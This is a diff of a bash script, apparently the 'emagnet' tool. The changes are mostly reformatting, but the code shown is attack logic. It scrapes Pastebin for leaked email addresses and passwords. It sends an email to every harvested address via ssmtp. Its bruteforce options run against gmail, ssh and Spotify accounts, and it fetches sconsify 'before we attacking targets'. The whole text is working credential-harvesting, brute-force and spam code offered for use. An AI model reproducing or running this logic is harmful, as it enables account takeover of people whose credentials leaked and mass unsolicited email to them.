@@ -665,17 +665,15 @@ else
         read -p "- Do you want to send an email to all targets (yes/NO): " sendtoall
              case $sendtoall in
                   "yes")
-                          printf "%62s \n" | tr ' ' '='
-                          grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETDB|cut -d: -f2 > $HOME/.config/emagnet/tmp/.emagnet-spam
-                          while read e1; do
-                            printf "%-57s%s\n" "[+] Sending email to $e1 $(ssmtp $e1 < "$EMAIL2SEND")" "[DONE]" | tr ' ' '.'
-                          done < "$HOME/.config/emagnet/tmp/.emagnet-spam"
-                            rm "$HOME/.config/emagnet/tmp/.emagnet-spam" &> /dev/null
-                          ;;
+                     printf "%62s \n" | tr ' ' '='
+                     grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETDB|cut -d: -f2 > $HOME/.config/emagnet/tmp/.emagnet-spam
+                      while read e1; do printf "%-57s%s\n" "[+] Sending email to $e1 $(ssmtp $e1 < "$EMAIL2SEND")" "[DONE]" | tr ' ' '.';done < "$HOME/.config/emagnet/tmp/.emagnet-spam"
+                     rm "$HOME/.config/emagnet/tmp/.emagnet-spam" &> /dev/null
+                   ;;
                   "*")
-                          echo -e "- Aborted..\n"
-                          exit 1
-                          ;;
+                     echo -e "- Aborted..\n"
+                     exit 1
+                   ;;
              esac
 fi
 }
@@ -694,7 +692,7 @@ fi
 
 if [[ -z "$SYNTAX2DL" ]]; then echo -e "$basename$0: internal error -- you must include a syntax language (ex: bash, python or perl).";exit 1;fi
 
- curl -Ls "$PASTEBIN/archive/$SYNTAX2DL" \
+curl -Ls "$PASTEBIN/archive/$SYNTAX2DL" \
 |grep -o '<a href="/........' \
 |cut -d'/' -f2 \
 |grep -E '[0-9]{1,4}' \
@@ -761,8 +759,8 @@ et=$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETTEMP|tr '
 pf=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP|grep '\S'|sed 's/|/:/g'|awk '{print $1}'|cut -d: -f1|uniq|grep -v '"'\|','\|'<'|tr ' ' '\n')
 pl=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" "$EMAGNETTEMP"|awk '{print $1}'|cut -d':' -f2,3|cut -d'|' -f1|awk -F, '!seen[$1]++'|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'\|'index.html'\|'alerts'|grep -v '/')
 pt=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETTEMP|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v /|wc -l)
-[[ "$et" -lt 10 ]] && et="0$et";[[ "$pt" -lt 10 ]] && pt="0$pt"
 
+[[ "$et" -lt 10 ]] && et="0$et";[[ "$pt" -lt 10 ]] && pt="0$pt"
 if [[ "$pt" -gt "00" ]] && [[ "$et" -gt "00" ]]; then
   echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: Found ${pt} passwords from: $EMAGNETPW/${pf##*/}"      | xargs >> "$EMAGNETLOGS/emagnet.log"
   echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: Found ${et} email addresses from: $EMAGNETDB/${ef##*/}"|xargs >> "$EMAGNETLOGS/emagnet.log"
@@ -833,9 +831,9 @@ fi
     mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
     rm "$HOME/.config/emagnet/tmp/.emagnet" "$HOME/.config/emagnet/tmp/.emagnet1"  &> /dev/null
     sleep 2
-
-# No need to announce notify-send forever, will be conflicts when time has been set to a low value
-# but I dont bother to care about this, we kill it no matter what time is set due to freezes on some crap distros
+# Kill notify-send no matter what time is set 
+# because on some crap distros it freezes for 
+# unknown reason
     pkill -9 "notify-send" &> /dev/null
 }
 
@@ -870,7 +868,11 @@ if ! [[ -f "$CONF" ]]; then
 fi
 }
 
+# This is the most simple method to call
+# all functions until things get better sorted
+# and cleaned up, then we can use long options with args
 case "${1}" in
+
      "-a"|"-author"|"--author")
           emagnet_author
      ;;
@@ -887,14 +889,14 @@ case "${1}" in
       "-g"|"-bruteforce"|"--bruteforce")
           emagnet_iconnection
           emagnet_first_run
-          if [[ "$2" = "gmail" ]]; then
+           if [[ "$2" = "gmail" ]]; then
              sed -i 's/GBRUTEFORCE=false/GBRUTEFORCE=true/g' "$CONF"
              emagnet_conf
-                if [[ "$GBRUTEFORCE" = "true" ]]; then
-                   emagnet_run4ever
-                   emagnet_gmail_bruter
-                   mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
-                 fi
+              if [[ "$GBRUTEFORCE" = "true" ]]; then
+               emagnet_run4ever
+               emagnet_gmail_bruter
+               mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
+              fi
            elif [[ "$2" = "ssh" ]]; then
               emagnet_conf
               sed -i 's/SBRUTEFORCE=false/SBRUTEFORCE=true/g' "$CONF"
@@ -905,48 +907,47 @@ case "${1}" in
               		 emagnet_sshbruter
             fi
 
-
            elif [[ "$2" = "spotify" ]]; then
-            emagnet_conf
+            emagnet_conf # We need to use conf here since we edited the PBRUTER in the function so we must source it again
             find /usr/include -type d |grep 'libspotify' &> /dev/null
              if [[ "$?" -ne "0" ]]; then
-                  if [[ -z "$LIBSPOTIFY" ]]; then
+              if [[ -z "$LIBSPOTIFY" ]]; then
 	             printf "Libspotify is deprecated but is required for emagnet bruteforcing\nto work, do you have libspotify installed? (YES/no): "
-                     read LIBSPOTIFY
-                       if ! [[ "$LIBSPOTIFY" = "YES" ]]; then
-        	          echo "Can't continue until libspotify has been installed.."
-      		          echo "Exiting.."
-       		          exit 1
+               read LIBSPOTIFY
+                 if ! [[ "$LIBSPOTIFY" = "YES" ]]; then
+        	        echo "Can't continue until libspotify has been installed.."
+      		        echo "Exiting.."
+       		        exit 1
          	       fi
-                     sed -i '210d' "$CONF"
-                     sed -i '210 i LIBSPOTIFY=true' "$CONF"
-                  fi
-                else
-                      sed -i '210d' "$CONF"
-                      sed -i '210 i LIBSPOTIFY=true' "$CONF"
-                fi
-
-             ./sconsify -version &> /dev/null
-                if [[ "$?" -ne "0" ]]; then
+               sed -i '210d' "$CONF"
+               sed -i '210 i LIBSPOTIFY=true' "$CONF"
+             fi
+            else
+               sed -i '210d' "$CONF"
+               sed -i '210 i LIBSPOTIFY=true' "$CONF"
+           fi
+                   # 2ADD! - Check so unzip is installed - Mostly users have it installed so no rush!
+                     ./sconsify -version &> /dev/null
+                        if [[ "$?" -ne "0" ]]; then
                          echo "Sconsify is required to be installed before we attacking targets.."
                            read -p "Download and install sconsify (y/N): " installsconsify
                              if [[ "$installsconsify" -eq "y" ]]; then
-                                echo -e "Hold on, downloading sconsify.."
-                                wget -q --user-agent="${USERAGENT}" "https://github.com/fabiofalci/sconsify/releases/download/next-20180428/linux-x86_64-sconsify-0.6.0-next.zip"
-                                echo -e "Unzipping sconsify into current dir.."
-                                unzip -q -o "linux-x86_64-sconsify-0.6.0-next.zip"
-                                chmod +x ./sconsify
-                                echo -e "Cleaning up."
-                                rm "linux-x86_64-sconsify-0.6.0-next.zip"
-                                echo "All done.."
-                                sleep 2
+                              echo -e "Hold on, downloading sconsify.."
+                              wget -q --user-agent="${USERAGENT}" "https://github.com/fabiofalci/sconsify/releases/download/next-20180428/linux-x86_64-sconsify-0.6.0-next.zip"
+                              echo -e "Unzipping sconsify into current dir.."
+                              unzip -q -o "linux-x86_64-sconsify-0.6.0-next.zip"
+                              chmod +x ./sconsify
+                              echo -e "Cleaning up."
+                              rm "linux-x86_64-sconsify-0.6.0-next.zip"
+                              echo "All done.."
+                              sleep 2
                              else
-                               echo -e "$basename$0: internal error -- sconsify is required to be installed.."
-                               exit 1
+                              echo -e "$basename$0: internal error -- sconsify is required to be installed.."
+                              exit 1
                             fi
-                fi
-                        sed -i 's/PBRUTEFORCE=false/PBRUTEFORCE=true/g' "$CONF"
-                        emagnet_conf
+                        fi
+                    sed -i 's/PBRUTEFORCE=false/PBRUTEFORCE=true/g' "$CONF"
+                    emagnet_conf
 
                  if [[ "$PBRUTEFORCE" = "true" ]]; then
                                 emagnet_clear
